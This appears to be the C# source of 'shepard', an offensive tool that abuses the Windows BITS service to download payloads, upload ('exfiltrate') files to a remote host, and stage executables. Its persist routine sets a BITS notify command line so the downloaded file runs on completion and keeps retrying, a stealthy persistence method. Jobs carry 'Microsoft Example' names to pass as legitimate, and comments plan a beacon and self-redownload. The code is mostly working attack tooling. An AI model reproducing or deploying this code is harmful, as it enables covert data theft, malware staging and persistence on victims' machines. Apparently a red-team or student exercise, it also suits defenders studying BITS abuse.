using System;
using System.Net;
using BITS = BITSReference1_5;


//add a beacon function somewhere in main ^
//redownload this executable and run again using bits, different job
namespace shepard
{
    class JobObj
    {
        static BITS.BackgroundCopyManager1_5 mgr;
        static BITS.GUID jobGuid;
        static BITS.IBackgroundCopyJob2 job;
        static JobObj jo;

        public JobObj()
        {
            mgr = new BITS.BackgroundCopyManager1_5();
        }

        public static void Main(string[] args)
        {
            if (args.Length == 0) { return; }

            jo = new JobObj();

            if (args.Length == 3)
            {
                //ex shepard -d remoteLoc writeLoc
                if (args[0] == "-d")
                {
                    jo.downloadFile("Microsoft Example QD_1", args[1], args[2]);
                }
                //ex shepard -e remoteLoc writeLoc
                else if (args[0] == "-e")
                {
                    jo.exfiltrateFile("Microsoft Example QE_1", args[1], args[2]);
                }
            }
            else if (args.Length == 4)
            {
                //ex shepard -dr remoteLoc writeLoc "argument argument argument" 
                if (args[0] == "-dr")
                {
                    string temp = args[3];
                    if (args[3] == "")
                    {
                        temp = "";
                    }
                    jo.stager(args[1], args[2], temp);
                }
            }
            else { return; }

        }

        private void stager(string remoteLoc, string writeLoc, string optArgs)
        {
            string name = "Microsoft Example BD_1";
            jo.downloadFile(name, remoteLoc, writeLoc); //initial download, completes

            jo.persist(name, remoteLoc, writeLoc, optArgs);
        }

        //Usage params: url or ip:port, full path
        private void downloadFile(string name, string remoteLoc, string writeLoc)
        {
            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
            //job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Users\student\Desktop\Server2016.pdf");
            //job.AddFile("23.52.161.19:443", @"C:\Users\student\Desktop\Server2016.pdf");
            job.AddFile(remoteLoc, writeLoc);
            jo.executeBITSJob();

        }

        //Usage params: url or ip:port, full path
        private void exfiltrateFile(string name, string remoteLoc, string writeLoc)
        {
            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job);
            job.AddFile(remoteLoc, writeLoc);
            jo.executeBITSJob();
        }

        //Default execution of a BITS Job, fully completes
        private void executeBITSJob()
        {
            job.Resume();
            bool jobIsFinal = false;
            while (!jobIsFinal)
            {
                BITS.BG_JOB_STATE state;
                job.GetState(out state);
                switch (state)
                {
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_ERROR:
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_TRANSFERRED:
                        job.Complete();
                        break;

                    case BITS.BG_JOB_STATE.BG_JOB_STATE_CANCELLED: //can i use this?
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_ACKNOWLEDGED:
                        jobIsFinal = true;
                        break;
                    default:
                        System.Threading.Tasks.Task.Delay(500); // delay a little bit
                        break;
                }
            }
        }

        //Usage: BITS job name, file path, "file args"
        private void persist(string name, string remote, string filePath, string cmdArgs)
        {
            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
            job.AddFile(remote, filePath);
            job.SetNotifyCmdLine(filePath, cmdArgs); //runs the file through CMD with params
            job.SetMinimumRetryDelay(60);
            
            job.Resume();
        }
    }
}
